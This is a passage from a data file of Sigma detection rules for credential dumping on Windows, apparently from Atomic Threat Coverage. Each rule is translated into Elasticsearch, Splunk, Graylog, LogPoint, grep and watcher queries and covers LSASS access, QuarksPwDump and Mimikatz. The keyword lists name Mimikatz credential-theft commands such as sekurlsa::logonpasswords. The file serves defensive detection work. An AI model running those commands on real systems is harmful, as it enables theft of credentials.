\"*\\\\\\\\monitoringhost.exe\", \"*\\\\\\\\wmic.exe\", \"*\\\\\\\\msiexec.exe\", \"*\\\\\\\\bash.exe\", \"*\\\\\\\\wscript.exe\", \"*\\\\\\\\cscript.exe\", \"*\\\\\\\\mshta.exe\", \"*\\\\\\\\regsvr32.exe\", \"*\\\\\\\\schtasks.exe\", \"*\\\\\\\\dnx.exe\", \"*\\\\\\\\regsvcs.exe\", \"*\\\\\\\\sc.exe\", \"*\\\\\\\\scriptrunner.exe\"])  -(Image=\"*Visual Studio*\")) OR ((event_id=\"7\" ImageLoaded IN [\"*\\\\\\\\dbghelp.dll\", \"*\\\\\\\\dbgcore.dll\"] Signed=\"FALSE\")  -(Image=\"*Visual Studio*\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*(?:.*(?=.*7)(?=.*(?:.*.*\\\\dbghelp\\\\.dll|.*.*\\\\dbgcore\\\\.dll))(?=.*(?:.*.*\\\\msbuild\\\\.exe|.*.*\\\\cmd\\\\.exe|.*.*\\\\svchost\\\\.exe|.*.*\\\\rundll32\\\\.exe|.*.*\\\\powershell\\\\.exe|.*.*\\\\word\\\\.exe|.*.*\\\\excel\\\\.exe|.*.*\\\\powerpnt\\\\.exe|.*.*\\\\outlook\\\\.exe|.*.*\\\\monitoringhost\\\\.exe|.*.*\\\\wmic\\\\.exe|.*.*\\\\msiexec\\\\.exe|.*.*\\\\bash\\\\.exe|.*.*\\\\wscript\\\\.exe|.*.*\\\\cscript\\\\.exe|.*.*\\\\mshta\\\\.exe|.*.*\\\\regsvr32\\\\.exe|.*.*\\\\schtasks\\\\.exe|.*.*\\\\dnx\\\\.exe|.*.*\\\\regsvcs\\\\.exe|.*.*\\\\sc\\\\.exe|.*.*\\\\scriptrunner\\\\.exe))))(?=.*(?!.*(?:.*(?=.*.*Visual Studio.*)))))|.*(?:.*(?=.*(?:.*(?=.*7)(?=.*(?:.*.*\\\\dbghelp\\\\.dll|.*.*\\\\dbgcore\\\\.dll))(?=.*FALSE)))(?=.*(?!.*(?:.*(?=.*.*Visual Studio.*)))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Password Dumper Remote Thread in LSASS\nid: f239b326-2f41-4d6b-9dfa-c846a60ef505\ndescription: Detects password dumper activity by monitoring remote thread creation EventID 8 in combination with the lsass.exe process as TargetImage. The process\n    in field Process is the malicious program. A single execution can lead to hundreds of events.\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/WCE.htm\nstatus: stable\nauthor: Thomas Patzke\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 8\n        TargetImage: 'C:\\Windows\\System32\\lsass.exe'\n        StartModule: null\n    condition: selection\ntags:\n    - attack.credential_access\n    - attack.t1003\n    - attack.s0005\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Password Dumper Remote Thread in LSASS\nid: f239b326-2f41-4d6b-9dfa-c846a60ef505\ndescription: Detects password dumper activity by monitoring remote thread creation EventID 8 in combination with the lsass.exe process as TargetImage. The process\n    in field Process is the malicious program. A single execution can lead to hundreds of events.\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/WCE.htm\nstatus: stable\nauthor: Thomas Patzke\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 8\n        TargetImage: 'C:\\Windows\\System32\\lsass.exe'\n        StartModule: null\n    condition: selection\ntags:\n    - attack.credential_access\n    - attack.t1003\n    - attack.s0005\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"8\" AND TargetImage:\"C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\lsass.exe\" AND NOT _exists_:StartModule)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Password-Dumper-Remote-Thread-in-LSASS <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Password Dumper Remote Thread in LSASS\",\\n    \"description\": \"Detects password dumper activity by monitoring remote thread creation EventID 8 in combination with the lsass.exe process as TargetImage. The process in field Process is the malicious program. A single execution can lead to hundreds of events.\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\",\\n      \"attack.s0005\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"8\\\\\" AND TargetImage:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\lsass.exe\\\\\" AND NOT _exists_:StartModule)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"8\\\\\" AND TargetImage:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\lsass.exe\\\\\" AND NOT _exists_:StartModule)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Password Dumper Remote Thread in LSASS\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"8\" AND TargetImage:\"C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\lsass.exe\" AND NOT _exists_:StartModule)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"8\" TargetImage=\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\lsass.exe\" NOT StartModule=\"*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"8\" TargetImage=\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\lsass.exe\" -StartModule=*)", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*8)(?=.*C:\\\\Windows\\\\System32\\\\lsass\\\\.exe)(?=.*(?!StartModule)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: QuarksPwDump Dump File\nid: 847def9e-924d-4e90-b7c4-5f581395a2b4\nstatus: experimental\ndescription: Detects a dump file written by QuarksPwDump password dumper\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/QuarksPWDump.htm\nauthor: Florian Roth\ndate: 2018/02/10\ntags:\n  - attack.credential_access\n  - attack.t1003\nlevel: critical\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        # Sysmon: File Creation (ID 11)\n        EventID: 11\n        TargetFilename: '*\\AppData\\Local\\Temp\\SAM-*.dmp*'\n    condition: selection\nfalsepositives:\n    - Unknown", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: QuarksPwDump Dump File\nid: 847def9e-924d-4e90-b7c4-5f581395a2b4\nstatus: experimental\ndescription: Detects a dump file written by QuarksPwDump password dumper\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/QuarksPWDump.htm\nauthor: Florian Roth\ndate: 2018/02/10\ntags:\n  - attack.credential_access\n  - attack.t1003\nlevel: critical\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        # Sysmon: File Creation (ID 11)\n        EventID: 11\n        TargetFilename: '*\\AppData\\Local\\Temp\\SAM-*.dmp*'\n    condition: selection\nfalsepositives:\n    - Unknown", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"11\" AND TargetFilename.keyword:*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\SAM\\\\-*.dmp*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/QuarksPwDump-Dump-File <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"QuarksPwDump Dump File\",\\n    \"description\": \"Detects a dump file written by QuarksPwDump password dumper\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"11\\\\\" AND TargetFilename.keyword:*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Local\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\SAM\\\\\\\\-*.dmp*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"11\\\\\" AND TargetFilename.keyword:*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Local\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\SAM\\\\\\\\-*.dmp*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'QuarksPwDump Dump File\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"11\" AND TargetFilename.keyword:*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\SAM\\\\-*.dmp*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"11\" TargetFilename=\"*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\SAM-*.dmp*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"11\" TargetFilename=\"*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\SAM-*.dmp*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*11)(?=.*.*\\\\AppData\\\\Local\\\\Temp\\\\SAM-.*\\\\.dmp.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Unsigned image loaded into LSASS process\nid: 857c8db3-c89b-42fb-882b-f681c7cf4da2\ndescription: Loading unsigned image (DLL, EXE) into LSASS process\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\nmodified: 2019/11/13\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 7\n        Image|endswith: '\\lsass.exe'\n        Signed: 'false'\n    condition: selection\nfalsepositives:\n    - Valid user connecting using RDP\nstatus: experimental\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Unsigned image loaded into LSASS process\nid: 857c8db3-c89b-42fb-882b-f681c7cf4da2\ndescription: Loading unsigned image (DLL, EXE) into LSASS process\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\nmodified: 2019/11/13\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 7\n        Image|endswith: '\\lsass.exe'\n        Signed: 'false'\n    condition: selection\nfalsepositives:\n    - Valid user connecting using RDP\nstatus: experimental\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"7\" AND Image.keyword:*\\\\\\\\lsass.exe AND Signed:\"false\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Unsigned-image-loaded-into-LSASS-process <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Unsigned image loaded into LSASS process\",\\n    \"description\": \"Loading unsigned image (DLL, EXE) into LSASS process\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"7\\\\\" AND Image.keyword:*\\\\\\\\\\\\\\\\lsass.exe AND Signed:\\\\\"false\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"7\\\\\" AND Image.keyword:*\\\\\\\\\\\\\\\\lsass.exe AND Signed:\\\\\"false\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Unsigned image loaded into LSASS process\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"7\" AND Image.keyword:*\\\\\\\\lsass.exe AND Signed:\"false\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"7\" Image=\"*\\\\\\\\lsass.exe\" Signed=\"false\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"7\" Image=\"*\\\\\\\\lsass.exe\" Signed=\"false\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*7)(?=.*.*\\\\lsass\\\\.exe)(?=.*false))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1003 Active Directory Replication from Non Machine Account\nid: 17d619c1-e020-4347-957e-1d1207455c93\ndescription: Detects potential abuse of Active Directory Replication Service (ADRS) from a non machine account to request credentials.\nstatus: experimental\ndate: 2019/07/26\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/06_credential_access/T1003_credential_dumping/ad_replication_non_machine_account.md\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4662\n        AccessMask: '0x100'\n        Properties|contains:\n            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'\n            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'\n            - '89e95b76-444d-4c62-991a-0facbeda640c'\n    filter:\n        SubjectUserName|endswith: '$'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: T1003 Active Directory Replication from Non Machine Account\nid: 17d619c1-e020-4347-957e-1d1207455c93\ndescription: Detects potential abuse of Active Directory Replication Service (ADRS) from a non machine account to request credentials.\nstatus: experimental\ndate: 2019/07/26\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/06_credential_access/T1003_credential_dumping/ad_replication_non_machine_account.md\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4662\n        AccessMask: '0x100'\n        Properties|contains:\n            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'\n            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'\n            - '89e95b76-444d-4c62-991a-0facbeda640c'\n    filter:\n        SubjectUserName|endswith: '$'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"4662\" AND AccessMask:\"0x100\" AND Properties.keyword:(*1131f6aa\\\\-9c07\\\\-11d1\\\\-f79f\\\\-00c04fc2dcd2* OR *1131f6ad\\\\-9c07\\\\-11d1\\\\-f79f\\\\-00c04fc2dcd2* OR *89e95b76\\\\-444d\\\\-4c62\\\\-991a\\\\-0facbeda640c*)) AND (NOT (SubjectUserName.keyword:*$)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1003-Active-Directory-Replication-from-Non-Machine-Account <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1003 Active Directory Replication from Non Machine Account\",\\n    \"description\": \"Detects potential abuse of Active Directory Replication Service (ADRS) from a non machine account to request credentials.\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"4662\\\\\" AND AccessMask:\\\\\"0x100\\\\\" AND Properties.keyword:(*1131f6aa\\\\\\\\-9c07\\\\\\\\-11d1\\\\\\\\-f79f\\\\\\\\-00c04fc2dcd2* OR *1131f6ad\\\\\\\\-9c07\\\\\\\\-11d1\\\\\\\\-f79f\\\\\\\\-00c04fc2dcd2* OR *89e95b76\\\\\\\\-444d\\\\\\\\-4c62\\\\\\\\-991a\\\\\\\\-0facbeda640c*)) AND (NOT (SubjectUserName.keyword:*$)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"4662\\\\\" AND AccessMask:\\\\\"0x100\\\\\" AND Properties.keyword:(*1131f6aa\\\\\\\\-9c07\\\\\\\\-11d1\\\\\\\\-f79f\\\\\\\\-00c04fc2dcd2* OR *1131f6ad\\\\\\\\-9c07\\\\\\\\-11d1\\\\\\\\-f79f\\\\\\\\-00c04fc2dcd2* OR *89e95b76\\\\\\\\-444d\\\\\\\\-4c62\\\\\\\\-991a\\\\\\\\-0facbeda640c*)) AND (NOT (SubjectUserName.keyword:*$)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1003 Active Directory Replication from Non Machine Account\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"4662\" AND AccessMask:\"0x100\" AND Properties.keyword:(*1131f6aa\\\\-9c07\\\\-11d1\\\\-f79f\\\\-00c04fc2dcd2* *1131f6ad\\\\-9c07\\\\-11d1\\\\-f79f\\\\-00c04fc2dcd2* *89e95b76\\\\-444d\\\\-4c62\\\\-991a\\\\-0facbeda640c*)) AND (NOT (SubjectUserName.keyword:*$)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"4662\" AccessMask=\"0x100\" (Properties=\"*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*\" OR Properties=\"*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*\" OR Properties=\"*89e95b76-444d-4c62-991a-0facbeda640c*\")) NOT (SubjectUserName=\"*$\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" (event_id=\"4662\" AccessMask=\"0x100\" Properties IN [\"*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*\", \"*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*\", \"*89e95b76-444d-4c62-991a-0facbeda640c*\"])  -(SubjectUserName=\"*$\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*4662)(?=.*0x100)(?=.*(?:.*.*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2.*|.*.*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2.*|.*.*89e95b76-444d-4c62-991a-0facbeda640c.*))))(?=.*(?!.*(?:.*(?=.*.*\\\\$)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: LSASS Access Detected via Attack Surface Reduction\nid: a0a278fe-2c0e-4de2-ac3c-c68b08a9ba98\ndescription: Detects Access to LSASS Process\nstatus: experimental\nreferences:\n    - https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard?WT.mc_id=twitter\nauthor: Markus Neis\ndate: 2018/08/26\ntags:\n    - attack.credential_access\n    - attack.t1003\n# Defender Attack Surface Reduction\nlogsource:\n    product: windows_defender\n    definition: 'Requirements:Enabled Block credential stealing from the Windows local security authority subsystem (lsass.exe) from Attack Surface Reduction (GUID: 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2)'\ndetection:\n    selection:\n        EventID: 1121\n        Path: '*\\lsass.exe'\n    condition: selection\nfalsepositives:\n    - Google Chrome GoogleUpdate.exe\n    - Some Taskmgr.exe related activity\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: LSASS Access Detected via Attack Surface Reduction\nid: a0a278fe-2c0e-4de2-ac3c-c68b08a9ba98\ndescription: Detects Access to LSASS Process\nstatus: experimental\nreferences:\n    - https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard?WT.mc_id=twitter\nauthor: Markus Neis\ndate: 2018/08/26\ntags:\n    - attack.credential_access\n    - attack.t1003\n# Defender Attack Surface Reduction\nlogsource:\n    product: windows_defender\n    definition: 'Requirements:Enabled Block credential stealing from the Windows local security authority subsystem (lsass.exe) from Attack Surface Reduction (GUID: 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2)'\ndetection:\n    selection:\n        EventID: 1121\n        Path: '*\\lsass.exe'\n    condition: selection\nfalsepositives:\n    - Google Chrome GoogleUpdate.exe\n    - Some Taskmgr.exe related activity\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"1121\" AND Path.keyword:*\\\\\\\\lsass.exe)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/LSASS-Access-Detected-via-Attack-Surface-Reduction <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"LSASS Access Detected via Attack Surface Reduction\",\\n    \"description\": \"Detects Access to LSASS Process\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"1121\\\\\" AND Path.keyword:*\\\\\\\\\\\\\\\\lsass.exe)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"1121\\\\\" AND Path.keyword:*\\\\\\\\\\\\\\\\lsass.exe)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'LSASS Access Detected via Attack Surface Reduction\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"1121\" AND Path.keyword:*\\\\\\\\lsass.exe)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"1121\" Path=\"*\\\\\\\\lsass.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1121\" Path=\"*\\\\\\\\lsass.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*1121)(?=.*.*\\\\lsass\\\\.exe))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Mimikatz Use\nid: 06d71506-7beb-4f22-8888-e2e5e2ca7fd8\ndescription: This method detects mimikatz keywords in different Eventlogs (some of them only appear in older Mimikatz version that are however still used by different\n    threat groups)\nauthor: Florian Roth\ndate: 2017/01/10\nmodified: 2019/10/11\ntags:\n    - attack.s0002\n    - attack.t1003\n    - attack.lateral_movement\n    - attack.credential_access\n    - car.2013-07-001\n    - car.2019-04-004\nlogsource:\n    product: windows\ndetection:\n    keywords:\n        Message:\n        - \"* mimikatz *\"\n        - \"* mimilib *\"\n        - \"* <3 eo.oe *\"\n        - \"* eo.oe.kiwi *\"\n        - \"* privilege::debug *\"\n        - \"* sekurlsa::logonpasswords *\"\n        - \"* lsadump::sam *\"\n        - \"* mimidrv.sys *\"\n        - \"* p::d *\"\n        - \"* s::l *\"\n    condition: keywords\nfalsepositives:\n    - Naughty administrators\n    - Penetration test\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Mimikatz Use\nid: 06d71506-7beb-4f22-8888-e2e5e2ca7fd8\ndescription: This method detects mimikatz keywords in different Eventlogs (some of them only appear in older Mimikatz version that are however still used by different\n    threat groups)\nauthor: Florian Roth\ndate: 2017/01/10\nmodified: 2019/10/11\ntags:\n    - attack.s0002\n    - attack.t1003\n    - attack.lateral_movement\n    - attack.credential_access\n    - car.2013-07-001\n    - car.2019-04-004\nlogsource:\n    product: windows\ndetection:\n    keywords:\n        Message:\n        - \"* mimikatz *\"\n        - \"* mimilib *\"\n        - \"* <3 eo.oe *\"\n        - \"* eo.oe.kiwi *\"\n        - \"* privilege::debug *\"\n        - \"* sekurlsa::logonpasswords *\"\n        - \"* lsadump::sam *\"\n        - \"* mimidrv.sys *\"\n        - \"* p::d *\"\n        - \"* s::l *\"\n    condition: keywords\nfalsepositives:\n    - Naughty administrators\n    - Penetration test\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "Message.keyword:(*\\\\ 